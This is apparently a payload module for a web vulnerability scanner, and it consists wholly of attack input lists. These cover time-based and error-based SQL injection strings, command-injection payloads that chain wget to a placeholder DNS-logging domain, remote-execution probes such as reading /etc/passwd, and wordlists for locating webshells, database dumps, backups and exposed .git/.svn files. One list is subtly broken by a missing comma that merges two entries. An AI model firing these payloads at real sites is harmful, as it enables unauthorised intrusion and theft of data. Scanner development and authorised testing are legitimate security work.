#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-03-07 11:48:33
# @Author  : donot (donot@donot.me)
# @Link    : https://blog.donot.me

SQLiPayload_Sleep = [
	' and {sleep}',
	' and {sleep} -- -',
	' and {sleep} #',
    '\' and {sleep} -- -',
    '\' and {sleep} #',
    '\' and {sleep} and \'1\'=\'1',
    '{sleep}',
    'if(1=1,{sleep},1)',
    '" and {sleep} -- -',
    '" and {sleep} #',
    '" and {sleep} and "1"="1',
    "') and {sleep} -- -", 
    "') and {sleep} #", 
    '\') and {sleep} and (\'1\'=\'1',
    "')) and {sleep} --+-", 
    "')) and {sleep} #", 
    "')) and {sleep} (('1='1", 
    '") and {sleep} -- -',
    '") and {sleep} #',
    '") and {sleep} ("1"="1',
    '; WAITFOR DELAY \'0:0:3\';-- -',
    '\'; WAITFOR DELAY \'0:0:3\';-- -',
    '"; WAITFOR DELAY \'0:0:3\';-- -',
    '; select pg_sleep(3);-- -',
    '\';select pg_sleep(3);-- -',
    '";select pg_sleep(3);--+-',
    ' and 1=dbms_pipe.receive_message(\'XXX\',3)-- -',
    '\' and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3)-- -',
    '\' and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3) and \'1\'=\'',
    '" and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3)-- -',
    '" and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3) and "1"="1',
    '\') and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3)-- -'
]

SQLiPayload_Sleep_Normal = [
	' and 1',
	' and 1-- -',
	' and 1#',
	'\' and 1 -- -',
	'\' and 1 #',
	'\' and 1 and \'1\'=\'1',
	'',
	'if(1=1,1,1)',
	'" and 1 -- -',
	'" and 1 #',
	'" and "1"="1',
	'\') and 1 --+-',
	'\') and 1 #',
	'\') and 1 and (\'1\'=\'1',
	"')) and 1 -- -", 
	"')) and 1 #", 
	"')) and 1 (('1='1", 
	'") and 1 -- -',
	'") and 1 #',
	'") and 1 ("1"="1',
	'; --+-',
	'\'; --+-',
	'"; --+-',
	'; --+-',
	'\';--+-',
	'";--+-',
	' and 1=1-- -',
	'\' and 1=1-- -',
	'\' and 1=1 and \'1\'=\'',
	'" and 1=1-- -',
	'" and 1=1 and "1"="1',
	'\') and 1=1--+-'
]


SQLiPayload_ErrorBased = [
	'\'',
	'"',
	')',
	"\\",
	'-- -',
	'#',
	'`'
]


RCEPayload_DNSLOG = [
	';wget {randStr}.{DNSLogDomain};',
	'&&wget {randStr}.{DNSLogDomain}',
	'|wget {randStr}.{DNSLogDomain}',
	'`wget {randStr}.{DNSLogDomain}`',
	'$(wget {randStr}.{DNSLogDomain})',
	';wget{Separator}{randStr}.{DNSLogDomain}',
	'&&wget{Separator}{randStr}.{DNSLogDomain}',
	'|wget{Separator}{randStr}.{DNSLogDomain}',
	'`wget{Separator}{randStr}.{DNSLogDomain}',
	'$(wget{Separator}{randStr}.{DNSLogDomain})',
	# 'wget,{randStr}.{DNSLogDomain}',
]

RCEPayload_WEBLOG = [
	';wget {DNSLogDomain}/{randStr};',
	'&&wget {DNSLogDomain}/{randStr}',
	'|wget {DNSLogDomain}/{randStr}',
	'`wget {DNSLogDomain}/{randStr}`',
	'$(wget {DNSLogDomain}/{randStr})',
	';wget{Separator}{DNSLogDomain}/{randStr}',
	'&&wget{Separator}{DNSLogDomain}/{randStr}',
	'|wget{Separator}{DNSLogDomain}/{randStr}',
	'`wget{Separator}{DNSLogDomain}/{randStr}',
	'$(wget{Separator}{DNSLogDomain}/{randStr})',
]

RCEPayload_RESP = [
	['\'xor(phpinfo)or\'', 'phpinfo page'],
	['cat /etc/passwd', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'],
	['uname -a', 'Linux'],
	['cat /proc/version', 'Linux'],
	['set /a 1+222']
]


FILE_SCAN_PAYLODS_TXT = [
	'1.txt',
	'a.txt',
	'www.txt',
	'admin.txt',
	'{domain}.txt',
	'mima.txt',
	'd.txt',
	'密码.txt'
]


FILE_SCAN_PAYLODS_PHP = [
	'1.php',
	'a.php',
	'shell.php',
	'2.php',
	'test.php',
	'I.php',
	'upload.php',
	'upfile.php',
	'download.php',
	'xiazai.php',
	'backup.php',
	'back.php'
]


FILE_SCAN_PAYLODS_ASP = [
	'1.asp',
	'a.asp',
	'shell.asp',
	'2.asp',
	'test.asp',
	'upload.asp',
	'upfile.asp',
	'up.asp',
	'download.asp',
	'xiazia.asp',
	'backup.asp',
	'back.asp',
	'1.aspx',
	'a.aspx',
	'shell.aspx',
	'2.aspx',
	'test.aspx',
	'upload.aspx',
	'upfile.aspx',
	'up.aspx',
	'download.aspx',
	'xiazia.aspx',
	'backup.aspx',
	'back.aspx'
]


FILE_SCAN_PAYLODS_JSP = [
	'1.jsp',
	'2.jsp',
	'a.jsp',
	'shell.jsp',
	'test.jsp',
	'upload.jsp',
	'upfile.jsp',
	'up.jsp',
	'download.jsp',
	'xiazai.jsp',
	'backup.jsp',
	'back.jsp',
	'1.jspx',
	'2.jspx',
	'a.jspx',
	'shell.jspx',
	'test.jspx',
	'upload.jspx',
	'upfile.jspx',
	'up.jspx',
	'download.jspx',
	'xiazai.jspx',
	'backup.jspx',
	'back.jspx'
]

FILE_SCAN_PAYLODS_COMPRESSION = [
	'1.zip',
	'www.zip',
	'back.zip',
	'backup.zip',
	'{domain}.zip',
	'database.zip',
	'beifen.zip',
	'db.zip',
	'dbback.zip',
	'backupdb.zip',
	'2019.zip',
	'2018.zip',
	'2017.zip',
	'1.tar.gz',
	'www.tar.gz',
	'back.tar.gz',
	'backup.tar.gz',
	'{domain}.tar.gz',
	'database.tar.gz',
	'beifen.tar.gz',
	'db.tar.gz',
	'dbback.tar.gz',
	'backupdb.tar.gz',
	'2019.tar.gz',
	'2018.tar.gz',
	'2017.tar.gz',
	'1.rar',
	'www.rar',
	'back.rar',
	'backup.rar'
	'{domain}.rar',
	'database.rar',
	'beifen.rar',
	'db.rar',
	'dbback.rar',
	'backupdb.rar',
	'2019.rar',
	'2018.rar',
	'2017.rar',
]

FILE_SCAN_PAYLODS_SQL = [
	'1.sql',
	'2.sql',
	'db.sql',
	'back.sql',
	'install.sql',
	'{domain}.sql',
	'2019.sql',
	'2018.sql'
]

FILE_SCAN_PAYLODS_LOG = [
	'1.log',
	'2.log',
	'error.log',
	'test.log',
	'back.log',
	'www.log',
]


FILE_SCAN_PAYLODS_LEAK = [
	'.git/config',
	'.svn/entries',
	'.svn/wc.db'
]